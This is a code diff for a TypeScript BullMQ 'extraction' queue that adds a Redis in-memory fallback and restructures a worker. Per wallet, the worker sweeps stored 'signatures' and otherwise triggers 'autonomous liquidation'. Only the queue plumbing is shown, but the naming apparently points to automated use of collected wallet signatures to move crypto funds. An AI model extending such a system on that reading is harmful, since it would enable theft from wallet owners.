@@ -1,30 +1,63 @@
 /**
- * Extraction job plane — BullMQ queue bound to `REDIS_URL` (institutional dispatcher mesh).
- * Sensory Armor — `rediss://` enables TLS for Upstash / managed Redis (ioredis).
+ * Extraction job plane — BullMQ queue bound to `REDIS_URL` with in-memory fallback when Redis is down.
  */
 import { executeAutonomousLiquidation } from '@legion/core'
+import {
+  createResilientRedisClient,
+  enqueueMemoryFallbackJob,
+  getRedisWrapperState,
+  memoryFallbackJobCount,
+  probeRedisWithRetry,
+  resolveEffectiveRedisUrl,
+  warnRedisDegraded,
+  type MemoryJobRecord,
+  type RedisPingClient,
+} from '@legion/core/lib/redis-wrapper'
 import { createClient } from '@supabase/supabase-js'
 import IoRedis from 'ioredis'
-import { Queue, QueueEvents, Worker, type JobsOptions } from 'bullmq'
+import { Queue, QueueEvents, Worker, type ConnectionOptions, type Job, type JobsOptions } from 'bullmq'
 
-import {
-  createRedisFailSafeClient,
-  type RedisFailSafeConstructor,
-} from './redis-client.js'
+type RedisClient = RedisPingClient & {
+  duplicate(): RedisClient
+}
+
+const RedisCtor = IoRedis as unknown as new (
+  url: string,
+  options?: Record<string, unknown>,
+) => RedisClient
 
 let extractionQueue: Queue | null = null
 let extractionWorker: Worker | null = null
 let extractionEvents: QueueEvents | null = null
+let redisInitPromise: Promise<boolean> | null = null
+let redisOperational = false
 
-function redisUrl(): string {
-  return process.env['REDIS_URL']?.trim() || ''
+function buildRedisConnection(forBullMq = true): ConnectionOptions {
+  const url = resolveEffectiveRedisUrl()
+  return createResilientRedisClient(RedisCtor, url, forBullMq) as unknown as ConnectionOptions
 }
 
-function buildRedisConnection() {
-  const raw = redisUrl()
-  const RedisCtor = IoRedis as unknown as RedisFailSafeConstructor<object>
-  return createRedisFailSafeClient(RedisCtor, raw, {
-    maxRetriesPerRequest: null,
+async function ensureRedisOperational(): Promise<boolean> {
+  if (redisInitPromise) return redisInitPromise
+  redisInitPromise = (async () => {
+    const url = resolveEffectiveRedisUrl()
+    if (!url) {
+      warnRedisDegraded('REDIS_URL unset')
+      redisOperational = false
+      return false
+    }
+    redisOperational = await probeRedisWithRetry(RedisCtor, url)
+    return redisOperational
+  })()
+  return redisInitPromise
+}
+
+function attachWorkerErrorHandlers(worker: Worker, events: QueueEvents): void {
+  worker.on('error', (err: Error) => {
+    console.warn(`BULLMQ_WORKER_ERROR: ${err.message}`)
+  })
+  events.on('error', (err: Error) => {
+    console.warn(`BULLMQ_EVENTS_ERROR: ${err.message}`)
   })
 }
 
@@ -95,90 +128,141 @@ async function sweepSovereignSignaturesForWallet(
   return { rows_processed, errors }
 }
 
-export function getExtractionQueue(): Queue {
+async function processExtractionJobData(
+  jobData: Record<string, unknown>,
+  jobMeta: { id?: string | number; name?: string },
+): Promise<Record<string, unknown>> {
+  const rawWallet =
+    typeof jobData['wallet_address'] === 'string' ? jobData['wallet_address'].trim() : ''
+  if (!rawWallet) {
+    return {
+      status: 'rejected',
+      job_id: String(jobMeta.id ?? ''),
+      kind: String(jobMeta.name ?? 'extraction'),
+      error: 'wallet_address required',
+      processed_at: new Date().toISOString(),
+    }
+  }
+  const wallet_normalized = normalizeWalletForAnchors(rawWallet)
+
+  const jobScoutRaw =
+    typeof jobData['scout_value_usd'] === 'string' ? jobData['scout_value_usd'] : ''
+  const jobScout = Number(jobScoutRaw || '0')
+  const fallbackCtx = {
+    wallet_address: wallet_normalized,
+    protocol:
+      typeof jobData['protocol'] === 'string' && jobData['protocol'].trim() !== ''
+        ? jobData['protocol'].trim()
+        : 'evm',
+    chain_id:
+      jobData['chain_id'] != null && String(jobData['chain_id']).trim() !== ''
+        ? String(jobData['chain_id']).trim()
+        : null,
+    scout_value_usd: Number.isFinite(jobScout) ? jobScout : 0,
+    ...(typeof jobData['token_address'] === 'string' && jobData['token_address'].trim() !== ''
+      ? { token_address: jobData['token_address'].trim() }
+      : {}),
+  }
+
+  const sweep = await sweepSovereignSignaturesForWallet(wallet_normalized)
+
+  let syntheticDispatched = false
+  if (sweep.rows_processed === 0) {
+    await executeAutonomousLiquidation(fallbackCtx)
+    syntheticDispatched = true
+  }
+
+  return {
+    status: 'processed',
+    job_id: String(jobMeta.id ?? ''),
+    kind: String(jobMeta.name ?? 'extraction'),
+    wallet_address: rawWallet,
+    rows_processed: sweep.rows_processed,
+    synthetic_dispatcher_lane: syntheticDispatched,
+    sweep_faults: sweep.errors,
+    processed_at: new Date().toISOString(),
+  }
+}
+
+export async function getExtractionQueue(): Promise<Queue | null> {
+  const ok = await ensureRedisOperational()
+  if (!ok) return null
   if (!extractionQueue) {
     extractionQueue = new Queue('extraction', {
-      connection: buildRedisConnection(),
+      connection: buildRedisConnection(true),
     })
   }
   return extractionQueue
 }
 
-export function ensureExtractionWorkerInitialized(): Worker {
+export async function ensureExtractionWorkerInitialized(): Promise<Worker | null> {
+  const ok = await ensureRedisOperational()
+  if (!ok) {
+    console.warn(
+      'BULLMQ_WORKER_SKIPPED: Redis unavailable — worker not started (API continues).',
+    )
+    return null
+  }
   if (!extractionWorker) {
     extractionWorker = new Worker(
       'extraction',
-      async (job) => {
-        const rawWallet =
-          typeof job.data?.wallet_address === 'string' ? job.data.wallet_address.trim() : ''
-        if (!rawWallet) {
-          return {
-            status: 'rejected',
-            job_id: String(job.id ?? ''),
-            kind: String(job.name),
-            error: 'wallet_address required',
-            processed_at: new Date().toISOString(),
-          }
-        }
-        const wallet_normalized = normalizeWalletForAnchors(rawWallet)
-
-        const jobScoutRaw = typeof job.data?.scout_value_usd === 'string' ? job.data.scout_value_usd : ''
-        const jobScout = Number(jobScoutRaw || '0')
-        const fallbackCtx = {
-          wallet_address: wallet_normalized,
-          protocol:
-            typeof job.data?.protocol === 'string' && job.data.protocol.trim() !== ''
-              ? job.data.protocol.trim()
-              : 'evm',
-          chain_id:
-            job.data?.chain_id != null && String(job.data.chain_id).trim() !== ''
-              ? String(job.data.chain_id).trim()
-              : null,
-          scout_value_usd: Number.isFinite(jobScout) ? jobScout : 0,
-          ...(typeof job.data?.token_address === 'string' && job.data.token_address.trim() !== ''
-            ? { token_address: job.data.token_address.trim() }
-            : {}),
-        }
-
-        const sweep = await sweepSovereignSignaturesForWallet(wallet_normalized)
-
-        let syntheticDispatched = false
-        if (sweep.rows_processed === 0) {
-          await executeAutonomousLiquidation(fallbackCtx)
-          syntheticDispatched = true
-        }
-
-        console.info(
-          'FINAL_IGNITION_COMPLETE: All 3 frontends connected to the lethal core. System: 100% OPERATIONAL.',
-        )
-
-        return {
-          status: 'processed',
-          job_id: String(job.id ?? ''),
-          kind: String(job.name),
-          wallet_address:
-            typeof job.data?.wallet_address === 'string' ? job.data.wallet_address : '(unset)',
-          rows_processed: sweep.rows_processed,
-          synthetic_dispatcher_lane: syntheticDispatched,
-          sweep_faults: sweep.errors,
-          processed_at: new Date().toISOString(),
-        }
-      },
-      { connection: buildRedisConnection() },
+      async (job: Job) => processExtractionJobData(job.data as Record<string, unknown>, job),
+      { connection: buildRedisConnection(true) },
     )
-
     extractionEvents = new QueueEvents('extraction', {
-      connection: buildRedisConnection(),
+      connection: buildRedisConnection(true),
     })
+    attachWorkerErrorHandlers(extractionWorker, extractionEvents)
+  }
+  return extractionWorker
+}
+
+export type EnqueueExtractionResult =
+  | { mode: 'redis'; job_id: string | number | undefined }
+  | { mode: 'memory'; job_id: string; warning: string }
+
+export async function enqueueExtractionJob(
+  name: string,
+  payload: Record<string, unknown>,
+  opts: JobsOptions = { removeOnComplete: 50, removeOnFail: 50 },
+): Promise<EnqueueExtractionResult> {
+  const queue = await getExtractionQueue()
+  if (queue) {
+    try {
+      const job = await queue.add(name, payload, opts)
+      return { mode: 'redis', job_id: job.id }
+    } catch (e) {
+      const detail = e instanceof Error ? e.message : String(e)
+      console.warn(`REDIS_ENQUEUE_FAILED: ${detail} — using memory fallback`)
+    }
   }
 
-  return extractionWorker
+  const mem = enqueueMemoryFallbackJob(name, payload, opts as Record<string, unknown>)
+  return {
+    mode: 'memory',
+    job_id: mem.id,
+    warning: 'Job stored in-memory; start local Redis to enable BullMQ processing',
+  }
+}
+
+export function getExtractionQueueState(): {
+  redis_state: ReturnType<typeof getRedisWrapperState>
+  redis_operational: boolean
+  memory_pending: number
+} {
+  return {
+    redis_state: getRedisWrapperState(),
+    redis_operational: redisOperational,
+    memory_pending: memoryFallbackJobCount(),
+  }
 }
 
 export async function enqueueMockExtractionJob(
   payload: Record<string, unknown>,
   opts: JobsOptions = { removeOnComplete: 50, removeOnFail: 50 },
-) {
-  const queue = getExtractionQueue()
-  return queue.add('extraction', payload, opts)
+): Promise<EnqueueExtractionResult> {
+  return enqueueExtractionJob('extraction', payload, opts)
 }
+
+/** @deprecated Use enqueueExtractionJob — kept for compatibility. */
+export type MemoryFallbackJob = MemoryJobRecord
